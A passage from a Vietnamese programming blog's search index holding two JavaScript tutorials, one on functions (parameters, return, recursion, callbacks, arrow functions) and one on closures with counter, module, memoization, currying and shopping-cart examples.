calculateTax() trong giỏ hàng e-commerce. Lưu ý: Gọi hàm không tồn tại gây lỗi ReferenceError. Tránh gọi đệ quy vô hạn (stack overflow).\n5. Biến cục bộ trong hàm #Biến khai báo trong hàm (bằng let hoặc var) chỉ tồn tại trong phạm vi hàm đó, gọi là biến cục bộ.\nlet: Giới hạn trong block {} gần nhất. var: Giới hạn trong toàn bộ hàm. Lợi ích: Tránh xung đột với biến toàn cục, giữ hàm độc lập. Ví dụ:\nfunction tinhTong() { let a = 5; // Chỉ visible trong hàm var b = 10; // Chỉ visible trong hàm console.log(a + b); } tinhTong(); // -\u0026gt; 15 // console.log(a); // Lỗi: a không tồn tại Ví dụ trong hàm tính trung bình:\nfunction tinhTrungBinh(temps) { let sum = 0; // Biến cục bộ for (let i = 0; i \u0026lt; temps.length; i++) { sum += temps[i]; } return sum / temps.length; } Trường hợp thực tế:\nTrong hàm xử lý form đăng nhập, biến errorMessage chỉ cần tồn tại trong hàm để lưu thông báo lỗi tạm thời. Trong game, biến playerHealth trong hàm updateGameState() không nên ảnh hưởng đến biến toàn cục cùng tên. Lưu ý: Tránh dùng biến toàn cục trong hàm để giữ tính độc lập.\n6. Câu lệnh return #Câu lệnh return có hai vai trò:\nKết thúc hàm ngay lập tức. Trả về giá trị (nếu có) đến nơi gọi hàm. Không giá trị: Chỉ kết thúc hàm (thường dùng khi xử lý lỗi). Có giá trị: Trả về biểu thức (số, chuỗi, object, v.v.). Mặc định: Nếu không có return, hàm trả về undefined. Ví dụ kết thúc sớm:\nfunction kiemTraSoDuong(n) { if (n \u0026lt; 0) return \u0026#34;Số âm không hợp lệ\u0026#34;; return \u0026#34;Số dương\u0026#34;; } console.log(kiemTraSoDuong(-5)); // -\u0026gt; Số âm không hợp lệ Ví dụ trả về giá trị:\nfunction binhPhuong(x) { return x * x; } let ketQua = binhPhuong(4); console.log(ketQua); // -\u0026gt; 16 Áp dụng vào hàm tính trung bình:\nfunction tinhTrungBinh(temps) { let sum = 0; for (let i = 0; i \u0026lt; temps.length; i++) { sum += temps[i]; } return sum / temps.length; } console.log(tinhTrungBinh([10, 20, 30])); // -\u0026gt; 20 Trường hợp khác:\nHàm trả về object trong API: function layThongTinNguoiDung(id) { return { id, name: \u0026#34;Alice\u0026#34;, age: 30 }; } console.log(layThongTinNguoiDung(1)); // -\u0026gt; { id: 1, name: \u0026#34;Alice\u0026#34;, age: 30 } Lưu ý: Code sau return không chạy. Đảm bảo return giá trị đúng kiểu dữ liệu cần thiết.\n7. Tham số (Parameters) #Tham số là biến cục bộ nhận giá trị khi hàm được gọi (gọi là đối số - arguments).\nTùy chọn: Hàm có thể không có tham số. Thứ tự: Đối số phải khớp thứ tự tham số trong khai báo. Mặc định (ES6): Có thể gán giá trị mặc định. Ví dụ cơ bản:\nfunction cong(a, b = 0) { // Tham số mặc định return a + b; } console.log(cong(5)); // -\u0026gt; 5 (b = 0) console.log(cong(5, 3)); // -\u0026gt; 8 Tham số phức tạp:\nfunction xuLyMang(arr) { return arr.sort((a, b) =\u0026gt; a - b); } console.log(xuLyMang([3, 1, 2])); // -\u0026gt; [1, 2, 3] Áp dụng vào hàm tính trung bình:\nfunction tinhTrungBinh(temperatures) { let sum = 0; for (let i = 0; i \u0026lt; temperatures.length; i++) { sum += temperatures[i]; } return sum / temperatures.length; } let day1 = [ 12, 12, 11, 11, 10, 9, 9, 10, 12, 13, 15, 18, 21, 24, 24, 23, 25, 25, 23, 21, 20, 19, 17, 16, ]; console.log(`Trung bình ngày 1: ${tinhTrungBinh(day1)}`); let day2 = [ 17, 16, 14, 12, 10, 10, 10, 11, 13, 14, 15, 17, 22, 27, 29, 29, 27, 26, 24, 21, 19, 18, 17, 16, ]; console.log(`Trung bình ngày 2: ${tinhTrungBinh(day2)}`); Trường hợp thực tế:\nHàm sendEmail(to, subject, body) trong ứng dụng gửi thông báo. Hàm renderChart(data, options) trong thư viện vẽ biểu đồ. Lưu ý: Tránh lạm dụng tham số (giới hạn 3-5 tham số). Nếu cần nhiều, dùng object.\nfunction configChart({ data, type, color }) { console.log(`Biểu đồ ${type}:`, data, color); } 8. Shadowing #Tham số và biến cục bộ che lấp (shadow) biến toàn cục cùng tên.\nVí dụ:\nlet x = 100; function test(x) { // Shadow x toàn cục let y = 10; // Shadow y toàn cục (nếu có) console.log(x, y); } test(50); // -\u0026gt; 50, 10 console.log(x); // -\u0026gt; 100 Ví dụ phức tạp hơn:\nlet first = 10, second = 20, third = 40, fourth = 80; function cong(first, second) { // Shadow first, second return first + second + third + fourth; // third, fourth là toàn cục } console.log(cong(5, 7)); // -\u0026gt; 5 + 7 + 40 + 80 = 132 Lợi ích: Ngăn xung đột tên biến trong dự án lớn.\nTrường hợp thực tế: Trong thư viện, shadowing đảm bảo hàm không vô tình thay đổi biến toàn cục của ứng dụng.\n9. Kiểm tra tham số (Parameters Validation) #Kiểm tra đầu vào để tránh lỗi runtime hoặc kết quả không mong muốn.\nVí dụ trong hàm tính trung bình:\nfunction tinhTrungBinh(temperatures) { if (!(temperatures instanceof Array)) { return NaN; // Không phải mảng } let sum = 0; for (let i = 0; i \u0026lt; temperatures.length; i++) { if (typeof temperatures[i] !== \u0026#34;number\u0026#34;) return NaN; // Không phải số sum += temperatures[i]; } return sum / temperatures.length; } console.log(tinhTrungBinh(10)); // -\u0026gt; NaN console.log(tinhTrungBinh([10, \u0026#34;20\u0026#34;])); // -\u0026gt; NaN console.log(tinhTrungBinh([10, 20, 30])); // -\u0026gt; 20 Ví dụ kiểm tra email:\nfunction isValidEmail(email) { if (typeof email !== \u0026#34;string\u0026#34;) return false; const regex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/; return regex.test(email); } console.log(isValidEmail(\u0026#34;test@example.com\u0026#34;)); // -\u0026gt; true console.log(isValidEmail(123)); // -\u0026gt; false Trường hợp thực tế:\nKiểm tra input form (email, password length). Validate tham số API trước khi gửi request. Lưu ý: Sử dụng throw để ném lỗi trong các ứng dụng nghiêm ngặt.\nfunction chia(a, b) { if (b === 0) throw new Error(\u0026#34;Không chia cho 0\u0026#34;); return a / b; } 10. Đệ quy (Recursion) #Hàm gọi chính nó với đối số khác, thường dùng để giải bài toán có cấu trúc lặp.\nBase case: Điều kiện dừng để tránh vô hạn. Recursive case: Gọi lại hàm với vấn đề nhỏ hơn. Ví dụ giai thừa (iterative vs recursive):\nIterative:\nfunction giaiThua(n) { let result = 1; while (n \u0026gt; 1) { result *= n; n--; } return result; } console.log(giaiThua(6)); // -\u0026gt; 720 Recursive:\nfunction giaiThua(n) { return n \u0026lt;= 1 ? 1 : n * giaiThua(n - 1); } console.log(giaiThua(6)); // -\u0026gt; 720 Quá trình đệ quy cho 6!:\ngiaiThua(6) = 6 * giaiThua(5) giaiThua(5) = 5 * giaiThua(4) \u0026hellip; giaiThua(1) = 1 Kết quả: 6 * 5 * 4 * 3 * 2 * 1 = 720 Ví dụ khác: Số Fibonacci\nfunction fibonacci(n) { if (n \u0026lt;= 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); } console.log(fibonacci(5)); // -\u0026gt; 5 (dãy: 0, 1, 1, 2, 3, 5) Trường hợp thực tế:\nDuyệt cây thư mục (file system tree). Tìm đường đi trong đồ thị (DFS - Depth First Search). Lưu ý:\nĐệ quy tốn bộ nhớ stack (giới hạn ~10k calls). Dùng vòng lặp nếu hiệu suất là ưu tiên. 11. Hàm như thành viên hạng nhất (First-class Citizens) #Trong JavaScript, hàm được coi là first-class citizens, nghĩa là chúng có thể:\nLưu vào biến. Truyền làm đối số. Trả về từ hàm khác. Ví dụ lưu vào biến:\nlet sayHi = function () { console.log(\u0026#34;Xin chào!\u0026#34;); }; sayHi(); // -\u0026gt; Xin chào! console.log(typeof sayHi); // -\u0026gt; function Truyền làm đối số:\nfunction thucHien(phepTinh, a, b) { return phepTinh(a, b); } let cong = (x, y) =\u0026gt; x + y; console.log(thucHien(cong, 2, 3)); // -\u0026gt; 5 Trả về hàm:\nfunction taoBoDem() { let dem = 0; return function () { return ++dem; }; } let dem = taoBoDem(); console.log(dem()); // -\u0026gt; 1 console.log(dem()); // -\u0026gt; 2 Trường hợp thực tế:\nHàm map, filter trong mảng. Callback trong event listener. 12. Biểu thức hàm (Function Expressions) #Hàm có thể được khai báo như một biểu thức và gán cho biến.\nCó tên: let fn = function ten() {...}; Ẩn danh: let fn = function() {...}; Ví dụ có tên:\nlet cong = function cong(a, b) { return a + b; }; console.log(cong(10, 20)); // -\u0026gt; 30 Ẩn danh:\nlet tru = function (a, b) { return a - b; }; console.log(tru(20, 10)); // -\u0026gt; 10 Truyền trực tiếp:\nfunction thucHien(fn, a, b) { return fn(a, b); } console.log( thucHien( function (a, b) { return a * b; }, 10, 20 ) ); // -\u0026gt; 200 Trường hợp thực tế:\nIIFE (Immediately Invoked Function Expression): (function () { console.log(\u0026#34;Chạy ngay lập tức!\u0026#34;); })(); Callback trong array methods: [1, 2, 3].map(function (n) { return n * 2; }); // -\u0026gt; [2, 4, 6] Lưu ý: Biểu thức hàm không được hoisted như function statement.\n13. Callbacks #Callback là hàm được truyền làm đối số cho hàm khác, được gọi trong hàm đó.\nVí dụ đồng bộ:\nfunction xuLy(callback) { console.log(\u0026#34;Bắt đầu xử lý...\u0026#34;); callback(); console.log(\u0026#34;Kết thúc xử lý.\u0026#34;); } xuLy(function () { console.log(\u0026#34;Callback chạy!\u0026#34;); }); // Output: // Bắt đầu xử lý... // Callback chạy! // Kết thúc xử lý. Trường hợp thực tế:\nXử lý mảng với forEach: let names = [\u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Eve\u0026#34;]; names.forEach(function (name) { console.log(`Xin chào, ${name}!`); }); 14. Callbacks bất đồng bộ (Asynchronous Callbacks) #Callback bất đồng bộ được thực thi dựa trên sự kiện (event-driven), không theo thứ tự mã nguồn.\nVí dụ với setTimeout:\nfunction xuLyAsync(callback) { console.log(\u0026#34;Bắt đầu...\u0026#34;); setTimeout(callback, 1000); console.log(\u0026#34;Kết thúc.\u0026#34;); } xuLyAsync(function () { console.log(\u0026#34;Callback sau 1s\u0026#34;); }); // Output: // Bắt đầu... // Kết thúc. // (1s sau) Callback sau 1s Ví dụ event listener:\nwindow.addEventListener(\u0026#34;click\u0026#34;, function () { console.log(\u0026#34;Đã click vào trang!\u0026#34;); }); Trường hợp thực tế:\nFetch dữ liệu từ API: fetch(\u0026#34;https://api.example.com/data\u0026#34;) .then(function (response) { return response.json(); }) .then(function (data) { console.log(data); }); Lưu ý: Dùng Promise hoặc async/await để quản lý bất đồng bộ tốt hơn.\n15. setTimeout và setInterval # setTimeout(callback, ms): Chạy callback một lần sau ms mili-giây. setInterval(callback, ms): Lặp lại callback mỗi ms mili-giây, trả về id để dừng bằng clearInterval(id). Ví dụ dừng interval:\nfunction batDongHo() { let count = 0; let id = setInterval(function () { console.log(`Tick ${++count}`); if (count \u0026gt;= 5) clearInterval(id); }, 1000); } batDongHo(); Trường hợp thực tế:\nAnimation loop trong game. Polling API để cập nhật dữ liệu real-time. 16. Arrow Functions #Arrow function là dạng ngắn gọn của biểu thức hàm, sử dụng =\u0026gt;.\nCú pháp: (thamSo) =\u0026gt; bieuThuc Một tham số: Có thể bỏ ngoặc: x =\u0026gt; x * x Một lệnh: Bỏ return và {}: (a, b) =\u0026gt; a + b Khác biệt: Không bind this riêng (dùng trong OOP). Ví dụ:\nlet cong = (a, b) =\u0026gt; a + b; console.log(cong(10, 20)); // -\u0026gt; 30 Với body lớn:\nlet kiemTraSo = (n) =\u0026gt; { if (n \u0026gt; 0) return \u0026#34;Dương\u0026#34;; return \u0026#34;Không dương\u0026#34;; }; console.log(kiemTraSo(5)); // -\u0026gt; Dương Trong array method:\nlet numbers = [1, 2, 3]; numbers.forEach((n) =\u0026gt; console.log(n * 2)); // -\u0026gt; 2, 4, 6 Trường hợp thực tế:\nCallback ngắn trong React hooks. Sort mảng: numbers.sort((a, b) =\u0026gt; a - b). 17. Kết luận và mẹo sử dụng #Hàm là nền tảng của lập trình JavaScript, giúp mã nguồn trở nên linh hoạt, dễ bảo trì. Một số mẹo:\nGiữ hàm ngắn: \u0026lt;50 dòng, tập trung một nhiệm vụ. Sử dụng tham số mặc định: function fn(a = 0) {...} Tránh side effects: Không thay đổi biến ngoài hàm trừ khi cần thiết. Kiểm tra tham số: Luôn validate đầu vào. Học thêm: Closures, Generators, async/await để nâng cao kỹ năng. Thực hành: Xây mini-project như calculator, todo list, hoặc game đơn giản. 18. Tài liệu tham khảo # MDN Web Docs: Functions JavaScript.info: Functions ECMAScript Specification: Functions ","date":"14 October 2025","permalink":"http://localhost:1313/posts/ham/","section":"Posts","summary":"","title":"Hàm - function"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/java/","section":"Categories","summary":"","title":"Java"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/java/","section":"Tags","summary":"","title":"Java"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/javascript/","section":"Categories","summary":"","title":"JavaScript"},{"content":"Tháng thứ 6 học JavaScript, tôi tự tin là đã \u0026ldquo;biết\u0026rdquo; ngôn ngữ này. Biến, hàm, đối tượng, mảng - dễ ợt.\nCho đến khi tôi gặp đoạn code này trong buổi phỏng vấn:\nfor (var i = 0; i \u0026lt; 3; i++) { setTimeout(function() { console.log(i); }, 1000); } // Người phỏng vấn: \u0026#34;Kết quả là gì?\u0026#34; // Tôi: \u0026#34;0, 1, 2 chứ còn gì!\u0026#34; // Thực tế: 3, 3, 3 \u0026ldquo;Hả? Sao lại thế?\u0026rdquo;\nNgười phỏng vấn mỉm cười: \u0026ldquo;Bạn có biết closure không?\u0026rdquo;\n\u0026ldquo;Clo\u0026hellip; gì cơ?\u0026rdquo;\nTrượt phỏng vấn. Nhưng tò mò. Closure là gì mà quan trọng thế?\n3 tháng nghiên cứu, thực hành, và vô số lần \u0026ldquo;à ra thế!\u0026rdquo; sau, tôi cuối cùng cũng hiểu. Và nhận ra: Closure là một trong những tính năng quan trọng nhất của JavaScript.\nĐây là lộ trình để bạn hiểu closure - không cần mất 3 tháng như tôi.\n🎯 Trước khi hiểu Closure: Phạm Vi (Scope) #Phạm vi là gì? #Phạm vi = Nơi một biến có thể được truy cập.\nHãy tưởng tượng như tầng nhà:\n// Tầng trệt (toàn cục) const bienToanCuc = \u0026#34;Tôi ở tầng trệt\u0026#34;; function hamNgoai() { // Tầng 1 const bienTang1 = \u0026#34;Tôi ở tầng 1\u0026#34;; function hamTrong() { // Tầng 2 const bienTang2 = \u0026#34;Tôi ở tầng 2\u0026#34;; console.log(bienToanCuc); // ✅ Nhìn xuống tầng trệt được console.log(bienTang1); // ✅ Nhìn xuống tầng 1 được console.log(bienTang2); // ✅ Trong phòng mình } console.log(bienToanCuc); // ✅ Nhìn xuống được console.log(bienTang1); // ✅ Trong phòng mình console.log(bienTang2); // ❌ Không nhìn lên trên được! } console.log(bienToanCuc); // ✅ Trong phòng mình console.log(bienTang1); // ❌ Không lên được tầng 1 console.log(bienTang2); // ❌ Không lên được tầng 2 Quy tắc vàng: Bên trong có thể \u0026ldquo;nhìn ra ngoài\u0026rdquo;, nhưng bên ngoài không \u0026ldquo;nhìn vào trong\u0026rdquo;.\nSơ đồ: Chuỗi phạm vi - hàm bên trong có thể truy cập biến bên ngoài\nvar vs let vs const - Khác nhau về phạm vi #// var - Phạm vi hàm function kiemTraVar() { if (true) { var x = 10; } console.log(x); // ✅ 10 - var \u0026#34;thoát ra\u0026#34; khỏi khối if } // let/const - Phạm vi khối {} function kiemTraLet() { if (true) { let y = 10; const z = 20; } console.log(y); // ❌ Lỗi: y không tồn tại console.log(z); // ❌ Lỗi: z không tồn tại } // Vấn đề kinh điển của var for (var i = 0; i \u0026lt; 3; i++) { // var i có phạm vi cả hàm, không chỉ trong vòng lặp! } console.log(i); // 3 - i \u0026#34;rò rỉ\u0026#34; ra ngoài! // let giải quyết vấn đề này for (let j = 0; j \u0026lt; 3; j++) { // let j chỉ tồn tại trong vòng lặp } console.log(j); // ❌ Lỗi - tốt! Bài học: Luôn dùng let/const, không bao giờ dùng var.\n💡 Closure: Định nghĩa #Định nghĩa kỹ thuật: # \u0026ldquo;Closure là một hàm có thể truy cập biến ở phạm vi bên ngoài (bao quanh nó), ngay cả khi hàm bên ngoài đã kết thúc.\u0026rdquo;\nNói người thường hiểu:\n\u0026ldquo;Một hàm \u0026rsquo;nhớ\u0026rsquo; môi trường nơi nó được sinh ra, kể cả khi môi trường đó không còn tồn tại nữa.\u0026rdquo;\nGiống như: Con mang gen của cha mẹ, dù cha mẹ không còn ở bên.\nVí dụ đầu tiên: #function taoLoiChao(loiChao) { // loiChao = biến bên ngoài return function(ten) { // Hàm này \u0026#34;nhớ\u0026#34; loiChao console.log(`${loiChao}, ${ten}!`); }; } const chaoHello = taoLoiChao(\u0026#34;Hello\u0026#34;); const chaoXinChao = taoLoiChao(\u0026#34;Xin chào\u0026#34;); chaoHello(\u0026#34;Minh\u0026#34;); // \u0026#34;Hello, Minh!\u0026#34; chaoXinChao(\u0026#34;Hương\u0026#34;); // \u0026#34;Xin chào, Hương!\u0026#34; // Hàm taoLoiChao đã chạy xong, nhưng loiChao vẫn còn! Chuyện gì đã xảy ra?\ntaoLoiChao(\u0026quot;Hello\u0026quot;) chạy Tạo hàm bên trong nhớ loiChao Trả về hàm đó taoLoiChao kết thúc, bình thường loiChao nên \u0026ldquo;chết\u0026rdquo; Nhưng không! Hàm bên trong đã \u0026ldquo;đóng gói\u0026rdquo; loiChao lại Sau đó, chaoHello(\u0026quot;Minh\u0026quot;) vẫn dùng được loiChao = \u0026quot;Hello\u0026quot; Đây chính là closure!\nMinh họa: Hàm \u0026ldquo;mang theo\u0026rdquo; môi trường của nó\n🔍 Closure Trong Thực Tế #Ví dụ 1: Bộ đếm (Kinh điển) #// ❌ Tệ: Biến toàn cục let bodem = 0; function tang() { bodem++; return bodem; } // Vấn đề: Ai cũng có thể sửa bodem bodem = 100; // Oái! // ✅ Tốt: Closure bảo vệ biến riêng tư function taoBoDem() { let dem = 0; // Biến riêng tư return { tang: function() { dem++; return dem; }, giam: function() { dem--; return dem; }, layGiaTri: function() { return dem; } }; } const bodem = taoBoDem(); console.log(bodem.tang()); // 1 console.log(bodem.tang()); // 2 console.log(bodem.giam()); // 1 console.log(bodem.layGiaTri());// 1 // dem thực sự là riêng tư console.log(bodem.dem); // undefined bodem.dem = 100; // Không ảnh hưởng gì console.log(bodem.layGiaTri()); // Vẫn là 1! Lợi ích:\n✅ Đóng gói dữ liệu ✅ Biến riêng tư ✅ Kiểm soát truy cập Ví dụ 2: Xử lý sự kiện #// ❌ Vấn đề: Tất cả nút bấm hiện cùng giá trị function cauHinhNutBam() { const cacNutBam = document.querySelectorAll(\u0026#39;button\u0026#39;); for (var i = 0; i \u0026lt; cacNutBam.length; i++) { cacNutBam[i].addEventListener(\u0026#39;click\u0026#39;, function() { console.log(\u0026#39;Nút \u0026#39; + i + \u0026#39; được bấm\u0026#39;); // Luôn hiện \u0026#34;Nút 3 được bấm\u0026#34;! (nếu có 3 nút) }); } } // Tại sao? var i có phạm vi hàm, tất cả handler dùng chung i // Khi click, vòng lặp đã xong, i = 3 // ✅ Giải pháp 1: Dùng let (phạm vi khối) function cauHinhNutBam() { const cacNutBam = document.querySelectorAll(\u0026#39;button\u0026#39;); for (let i = 0; i \u0026lt; cacNutBam.length; i++) { // Mỗi lần lặp tạo i mới trong phạm vi riêng cacNutBam[i].addEventListener(\u0026#39;click\u0026#39;, function() { console.log(\u0026#39;Nút \u0026#39; + i + \u0026#39; được bấm\u0026#39;); // Đúng: Nút 0, Nút 1, Nút 2 }); } } // ✅ Giải pháp 2: Hàm ngay lập tức (IIFE) function cauHinhNutBam() { const cacNutBam = document.querySelectorAll(\u0026#39;button\u0026#39;); for (var i = 0; i \u0026lt; cacNutBam.length; i++) { (function(chiSo) { // Tạo closure với chiSo cacNutBam[chiSo].addEventListener(\u0026#39;click\u0026#39;, function() { console.log(\u0026#39;Nút \u0026#39; + chiSo + \u0026#39; được bấm\u0026#39;); }); })(i); // Truyền i làm tham số } } Câu hỏi phỏng vấn đã giải quyết! ✅\nVí dụ 3: Nhà máy sản xuất hàm #function taoBoNhan(soNhan) { return function(so) { return so * soNhan; }; } const nhanDoi = taoBoNhan(2); const nhanBa = taoBoNhan(3); const nhanBon = taoBoNhan(4); console.log(nhanDoi(5)); // 10 console.log(nhanBa(5)); // 15 console.log(nhanBon(5)); // 20 // Mỗi hàm \u0026#34;nhớ\u0026#34; soNhan riêng của nó! Ứng dụng thực tế:\n// Nhà máy tạo API client function taoAPIClient(urlGoc, apiKey) { return { get: function(duongDan) { return fetch(`${urlGoc}${duongDan}`, { headers: { \u0026#39;Authorization\u0026#39;: `Bearer ${apiKey}` } }); }, post: function(duongDan, duLieu) { return fetch(`${urlGoc}${duongDan}`, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Authorization\u0026#39;: `Bearer ${apiKey}`, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(duLieu) }); } }; } // Tạo các client khác nhau const githubAPI = taoAPIClient(\u0026#39;https://api.github.com\u0026#39;, \u0026#39;github_token\u0026#39;); const stripeAPI = taoAPIClient(\u0026#39;https://api.stripe.com\u0026#39;, \u0026#39;stripe_token\u0026#39;); // Mỗi cái nhớ urlGoc và apiKey riêng githubAPI.get(\u0026#39;/user/repos\u0026#39;); stripeAPI.post(\u0026#39;/charges\u0026#39;, { amount: 1000 }); 🎯 Mẫu thiết kế nâng cao với Closure #Mẫu 1: Module (Đóng gói) #const MayTinh = (function() { // Biến và hàm riêng tư let ketQua = 0; function ghiNhatKy(thongBao) { console.log(`[Máy tính] ${thongBao}`); } // API công khai return { cong: function(x) { ketQua += x; ghiNhatKy(`Cộng ${x}, kết quả: ${ketQua}`); return this; // Cho phép gọi chuỗi }, tru: function(x) { ketQua -= x; ghiNhatKy(`Trừ ${x}, kết quả: ${ketQua}`); return this; }, nhan: function(x) { ketQua *= x; ghiNhatKy(`Nhân ${x}, kết quả: ${ketQua}`); return this; }, layKetQua: function() { return ketQua; }, datLai: function() { ketQua = 0; ghiNhatKy(\u0026#39;Đặt lại\u0026#39;); return this; } }; })(); // Sử dụng MayTinh .cong(5) .nhan(2) .tru(3) .layKetQua(); // 7 // Không thể truy cập các thành phần riêng tư MayTinh.ketQua; // undefined MayTinh.ghiNhatKy(\u0026#39;test\u0026#39;); // Lỗi Lợi ích:\n✅ Đóng gói ✅ Tách biệt public/private ✅ Tránh làm ô nhiễm namespace Mẫu 2: Ghi nhớ (Caching) #function ghiNho(ham) { const boNho = {}; // Bộ nhớ cache riêng tư qua closure return function(...thamSo) { const khoa = JSON.stringify(thamSo); if (khoa in boNho) { console.log(\u0026#39;Lấy từ bộ nhớ\u0026#39;); return boNho[khoa]; } console.log(\u0026#39;Tính toán kết quả\u0026#39;); const ketQua = ham.apply(this, thamSo); boNho[khoa] = ketQua; return ketQua; }; } // Hàm tốn kém function fibonacci(n) { if (n \u0026lt;= 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); } const fibGhiNho = ghiNho(fibonacci); console.log(fibGhiNho(40)); // Tính toán... 102334155 (chậm) console.log(fibGhiNho(40)); // Lấy từ bộ nhớ: 102334155 (tức thì!) Tăng hiệu suất: Nhanh hơn 1000 lần cho các lần gọi lặp lại!\nMẫu 3: Currying (Gọi từng phần) #// Hàm thông thường function cong(a, b, c) { return a + b + c; } cong(1, 2, 3); // 6 // Phiên bản curry function congCurry(a) { return function(b) { return function(c) { return a + b + c; }; }; } congCurry(1)(2)(3); // 6 // Hoặc với arrow function const congCurry = a =\u0026gt; b =\u0026gt; c =\u0026gt; a + b + c; // Áp dụng từng phần const cong5 = congCurry(5); const cong5Va10 = cong5(10); console.log(cong5Va10(3)); // 18 Ví dụ thực tế:\n// Tạo xử lý sự kiện tổng quát const taoXuLySuKien = loaiSuKien =\u0026gt; phanTu =\u0026gt; callback =\u0026gt; { phanTu.addEventListener(loaiSuKien, callback); }; const khiClick = taoXuLySuKien(\u0026#39;click\u0026#39;); const khiDiChuot = taoXuLySuKien(\u0026#39;mouseenter\u0026#39;); // Xử lý có thể tái sử dụng const clickNutBam = khiClick(document.querySelector(\u0026#39;button\u0026#39;)); const diChuotVaoDiv = khiDiChuot(document.querySelector(\u0026#39;div\u0026#39;)); clickNutBam(() =\u0026gt; console.log(\u0026#39;Nút được bấm\u0026#39;)); diChuotVaoDiv(() =\u0026gt; console.log(\u0026#39;Chuột vào div\u0026#39;)); ⚠️ Cạm bẫy Closure \u0026amp; Giải pháp #Cạm bẫy 1: Rò rỉ bộ nhớ #// ❌ Rò rỉ bộ nhớ function phepToanNang() { const duLieuLon = new Array(1000000).fill(\u0026#39;dữ liệu\u0026#39;); return function() { // Closure giữ tham chiếu đến duLieuLon console.log(duLieuLon.length); }; } const ham = phepToanNang(); // duLieuLon vẫn trong bộ nhớ dù không dùng! // ✅ Giải pháp: Chỉ \u0026#34;đóng gói\u0026#34; những gì cần function phepToanNang() { const duLieuLon = new Array(1000000).fill(\u0026#39;dữ liệu\u0026#39;); const doDai = duLieuLon.length; // Chỉ lấy giá trị cần thiết return function() { // Chỉ đóng gói doDai, không phải toàn bộ duLieuLon console.log(doDai); }; } Cạm bẫy 2: Vòng lặp + Bất đồng bộ #Đây là bug kinh điển từ đầu bài:\n// ❌ Vấn đề for (var i = 0; i \u0026lt; 3; i++) { setTimeout(function() { console.log(i); // 3, 3, 3 }, 1000); } // ✅ Giải pháp 1: let for (let i = 0; i \u0026lt; 3; i++) { setTimeout(function() { console.log(i); // 0, 1, 2 }, 1000); } // ✅ Giải pháp 2: IIFE for (var i = 0; i \u0026lt; 3; i++) { (function(chiSo) { setTimeout(function() { console.log(chiSo); // 0, 1, 2 }, 1000); })(i); } // ✅ Giải pháp 3: Truyền vào setTimeout for (var i = 0; i \u0026lt; 3; i++) { setTimeout(function(chiSo) { console.log(chiSo); // 0, 1, 2 }, 1000, i); } Cạm bẫy 3: Biến toàn cục vô tình #function taoBoDem() { // ❌ Quên \u0026#39;let\u0026#39; - tạo biến toàn cục! dem = 0; return function() { return ++dem; }; } const bodem1 = taoBoDem(); const bodem2 = taoBoDem(); console.log(bodem1()); // 1 console.log(bodem2()); // 2 (dùng chung biến toàn cục dem!) // ✅ Luôn dùng let/const function taoBoDem() { let dem = 0; // Phạm vi đúng return function() { return ++dem; }; } Dùng chế độ nghiêm ngặt để bắt lỗi:\n\u0026#39;use strict\u0026#39;; function taoBoDem() { dem = 0; // Lỗi: dem chưa được khai báo return function() { return ++dem; }; } 🏗️ Dự án thực tế: Giỏ hàng với Closure #function taoGioHang() { // Trạng thái riêng tư let cacMonHang = []; let tyLeGiamGia = 0; // Hàm hỗ trợ riêng tư function tinhTongMonHang(monHang) { return monHang.gia * monHang.soLuong; } // API công khai return { themMonHang: function(sanPham, soLuong = 1) { const monHangCoSan = cacMonHang.find(mh =\u0026gt; mh.id === sanPham.id); if (monHangCoSan) { monHangCoSan.soLuong += soLuong; } else { cacMonHang.push({ ...sanPham, soLuong }); } return this; }, xoaMonHang: function(idSanPham) { cacMonHang = cacMonHang.filter(mh =\u0026gt; mh.id !== idSanPham); return this; }, capNhatSoLuong: function(idSanPham, soLuong) { const monHang = cacMonHang.find(mh =\u0026gt; mh.id === idSanPham); if (monHang) { monHang.soLuong = soLuong; } return this; }, apDungGiamGia: function(tyLe) { tyLeGiamGia = tyLe; return this; }, tinhTongTien: function() { const tongTam = cacMonHang.reduce((tong, mh) =\u0026gt; { return tong + tinhTongMonHang(mh); }, 0); return tongTam * (1 - tyLeGiamGia); }, layDanhSach: function() { // Trả về bản sao để tránh sửa đổi từ bên ngoài return cacMonHang.map(mh =\u0026gt; ({ ...mh })); }, demSoLuong: function() { return cacMonHang.reduce((dem, mh) =\u0026gt; dem + mh.soLuong, 0); }, xoaTrang: function() { cacMonHang = []; tyLeGiamGia = 0; return this; } }; } // Sử dụng const gioHang = taoGioHang(); gioHang .themMonHang({ id: 1, ten: \u0026#39;Laptop\u0026#39;, gia: 20000000 }, 1) .themMonHang({ id: 2, ten: \u0026#39;Chuột\u0026#39;, gia: 500000 }, 2) .apDungGiamGia(0.1); // Giảm 10% console.log(\u0026#39;Tổng tiền:\u0026#39;, gioHang.tinhTongTien()); // 18.900.000đ console.log(\u0026#39;Số lượng:\u0026#39;, gioHang.demSoLuong()); // 3 // Mảng cacMonHang hoàn toàn riêng tư gioHang.cacMonHang; // undefined Tại sao dùng closure?\n✅ cacMonHang và tyLeGiamGia hoàn toàn riêng tư ✅ Kiểm soát truy cập qua các phương thức công khai ✅ Không thể làm rối trạng thái nội bộ từ bên ngoài ✅ API sạch đẹp 💡 Khi nào dùng Closure? #Nên dùng Closure cho: #✅ Bảo mật dữ liệu\nfunction taoNguoiDung(ten) { let matKhau; // Riêng tư! return { datMatKhau: (mk) =\u0026gt; { matKhau = mk; }, kiemTraMatKhau: (mk) =\u0026gt; { return mk === matKhau; } }; } ✅ Nhà máy hàm\nconst taoKiemTra = (bieuThuc) =\u0026gt; (dauVao) =\u0026gt; bieuThuc.test(dauVao); const laEmail = taoKiemTra(/^\\S+@\\S+$/); const laSoDienThoai = taoKiemTra(/^\\d{10}$/); ✅ Ghi nhớ/Cache\nconst hamGhiNho = ghiNho(hamTonKem); ✅ Xử lý sự kiện\nnutBam.addEventListener(\u0026#39;click\u0026#39;, taoXuLySuKien(duLieuNguoiDung)); ĐỪNG lạm dụng: #❌ Không cần closure cho hàm đơn giản\n// Thừa thãi const cong = (a) =\u0026gt; (b) =\u0026gt; a + b; // Chỉ cần thế này const 